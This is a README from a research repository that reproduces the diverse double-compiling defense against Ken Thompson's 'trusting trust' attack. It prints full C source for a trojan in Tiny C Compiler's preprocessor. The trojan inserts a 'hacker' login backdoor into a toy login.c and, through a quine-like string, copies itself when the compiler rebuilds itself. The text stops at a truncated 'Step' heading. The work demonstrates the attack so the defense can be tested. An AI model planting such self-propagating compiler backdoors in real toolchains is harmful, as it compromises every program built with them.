# Trusting trust defense

This repo aims to reproduce the diverse double-compiling procedure described in section 4 of this paper
Countering Trusting Trust through Diverse Double-Compiling.
http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.364.116&rep=rep1&type=pdf



## Experiments

### Enviroment

Ubuntu 18.04.5 LTS, kernel 5.4.0-53-generic 

On VirtualBox 6.1.12r139181

Gcc 7.5.0

Tiny c compiler from this repo https://github.com/TinyCC/tinycc.



### Step1: Write a login.c program.

./login/login.c is the file we want to hack. 

If the username is `tom` or `jerry` and the corresponding pasword is  correct, login.c will authorize, otherwise will reject.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NUM 2

char* username_list[] = {"tom", "jerry"};
char* password_list[] = {"1", "2"};

int main(int argc, char* argv[]) {
  if(argc < 3) {
    printf("Too few arguments!\n");
    return 0;
  }

  char* username = argv[1];
  char* password = argv[2];

  for(int i = 0; i < NUM; i++) {
    if(strcmp(username, username_list[i]) == 0
    && strcmp(password, password_list[i]) == 0) {
      printf("welcome!\n");
      return 0;
    }
  }

  printf("Reject!\n");
  return 0;
}
```

Then test it:

```bash
$zmx cd ./login
$zmx gcc -o login.out login.c
$zmx ./login.out tom 1
welcome!
$zmx ./login.out hacker 1
Reject!
```

The login.c will reject username `hacker`.



### Step2: Write a login_hacked.c program.

This which lines are added on the basis of login.c. We want our malicious compiler can also do this job.

```c
	}
	
+	if(strcmp(username, "hacker") == 0) {
+		printf("welcome!\n");
+		return 0;
+	}
	printf("Reject!\n");
```

Then test it:

```bash
$zmx gcc -o login_hacked.out login_hacked.c
$zmx ./login_hacked.out tom 1
welcome!
$zmx ./login_hacked.out hacker 1
welcome!
```

Now `hacker` can be authorised.



Step3: Download tcc and set up the environment

Directory `tinycc-clean` is the clean version of tcc source code, cloned from https://github.com/TinyCC/tinycc. It serves as a reference and helps to see what we have modified in `tinycc-tohack` and `tinycc-hack-itself`.

Directory `tinycc-tohack` is another clean version, but not identical to `tinycc-clean`. I increased the `IO_BUF_SIZE` in `tcc.h` so that the compiler can read in all the content of `tccpp.c` at the first time. Theoretically this is not allowed in DDC process, but without it the file will be divided into several block and processed in multiple loops, which will bring a lot of difficulty when hacking.

```bash
zmx$ diff tinycc-clean/tcc.h tinycc-tohack/tcc.h 
583c583
< #define IO_BUF_SIZE 8192
---
> #define IO_BUF_SIZE 120000
```

Directory `tinycc-hack-itself` is the compiler able to hack `login.c` and itself, I will introduce it later.



### Step3: Modify the compiler so that it can hack login.c as well as itself.

This step actually consists of two sub steps. Firstly I added Trojan horse in order to hack `login.c`, secondly I added another trojan horse that insert these two trojan horse in the binary of tcc when it compile itself. 

First of all I found the location the file is read is `tccpp.c:616`, thereby I added two trojan horses between line 616 and line 617 to insert the malicious code into `bf->buffer`.

```c
611: #if defined(PARSE_DEBUG)
612:             len = 1;
613: #else
614:             len = IO_BUF_SIZE;
615: #endif
  
616:             len = read(bf->fd, bf->buffer, len);
// code inserted here
617:             if (len < 0)
618:                 len = 0;
619:         } else {
620:             len = 0;
621:         }
```



Code I inserted is shown below. The comments is added to explain the code, they will not appear in the source code. 

```c
	// the reason I added counter for login.c and tccpp.c is I found the file may be visited multiple times, but the hack should only happen in the first time.
  static int counter1 = 0;
  static int counter2 = 0;
	// the source code to hack login.c
  const char* inject_login = "if(strcmp(username, %chacker%c) == 0) {%c    printf(%cwelcome!%cn%c);%c    return 0;%c  }%c  ";
	// if the file it's preprocessing is login.c, then hack.
  if(strstr(file->filename, "login.c") != NULL && counter1 == 0) {
    unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 200);
    snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 92, 34, 10, 10, 10);
    int inject_len = strlen(inject_login);
    unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
    // get the location we want to insert, in this case we want to insert malicious code before it prints "Reject!".
    unsigned char* inject_location = strstr(bf->buffer, "printf(\"Reject!");
    int pre_inject_len = inject_location - bf->buffer;
    new_buf[0] = ' ';
    strncpy(new_buf + 1, bf->buffer, pre_inject_len);
    strncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);
    strcat(new_buf, inject_location);
    len = len + inject_len - 9;
    strncpy(bf->buffer, new_buf, len);
    bf->buffer[len] = 0;
    tcc_free(inject_code);
    tcc_free(new_buf);
    // increament counter so the hack will never happen again.
    counter1++;
  }


	// the source code to insert itself to tccpp.c, make malicious tcc self-perpetuating.
	// inject_compiler is the string able to represent the whose code block I want to insert.
  const char* inject_compiler = 
    "static int counter1 = 0;%c  static int counter2 = 0;%c  const char* inject_login = %c%s%c;%c  if(strstr(file->filename, %clogin.c%c) != NULL && counter1 == 0) {%c    unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 200);%c    snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 92, 34, 10, 10, 10);%c    int inject_len = strlen(inject_login);%c    unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c    unsigned char* inject_location = strstr(bf->buffer, %cprintf(%c%cReject!%c);%c    int pre_inject_len = inject_location - bf->buffer;%c    new_buf[0] = %c %c;%c    strncpy(new_buf + 1, bf->buffer, pre_inject_len);%c    strncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);%c    strcat(new_buf, inject_location);%c    len = len + inject_len - 9;%c    strncpy(bf->buffer, new_buf, len);%c    bf->buffer[len] = 0;%c    tcc_free(inject_code);%c    tcc_free(new_buf);%c    counter1++;%c  }%c  if(strstr(file->filename, %ctccpp.c%c) != NULL && counter2 == 0) {%c  const char* inject_compiler = %c    %c%s%c;%c    unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 9900);%c    snprintf(inject_code, 9900, inject_compiler, 10, 10, 34, inject_login, 34, 10, 34, 34, 10, 10, 10, 10, 10, 34, 92, 34, 34, 10, 10, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 34, inject_compiler, 34, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10);%c    int inject_len = strlen(inject_code);%c    unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c    memset(new_buf, 0, sizeof(unsigned char) * IO_BUF_SIZE);%c    unsigned char* inject_location = strstr(bf->buffer, %cif (len < 0)%c);%c    int pre_inject_len = inject_location - bf->buffer;%c    strncpy(new_buf, bf->buffer, pre_inject_len);%c    strncpy(new_buf + pre_inject_len, inject_code, inject_len);%c    strcat(new_buf, inject_location);%c    len = len + inject_len - 1;%c    strncpy(bf->buffer, new_buf, len + 2);%c    bf->buffer[len + 2] = 0;%c    tcc_free(inject_code);%c    tcc_free(new_buf);%c    counter2++;%c  }%c            ";
  if(strstr(file->filename, "tccpp.c") != NULL && counter2 == 0) {
    unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 9900);
    snprintf(inject_code, 9900, inject_compiler, 10, 10, 34, inject_login, 34, 10, 34, 34, 10, 10, 10, 10, 10, 34, 92, 34, 34, 10, 10, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 34, inject_compiler, 34, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10);
    int inject_len = strlen(inject_code);
    unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
    memset(new_buf, 0, sizeof(unsigned char) * IO_BUF_SIZE);
    unsigned char* inject_location = strstr(bf->buffer, "if (len < 0)");
    int pre_inject_len = inject_location - bf->buffer;
    strncpy(new_buf, bf->buffer, pre_inject_len);
    strncpy(new_buf + pre_inject_len, inject_code, inject_len);
    strcat(new_buf, inject_location);
    len = len + inject_len - 1;
    strncpy(bf->buffer, new_buf, len + 2);
    bf->buffer[len + 2] = 0;
    tcc_free(inject_code);
    tcc_free(new_buf);
    counter2++;
  }
```

This step cost 90% of my time and I have to do a lot of compromise to get it finished. For example, I condense inject_compiler into a single line because its multi-line version is beyond its representation. Thus, it looks messy and confusing when I try modifying it.



Step

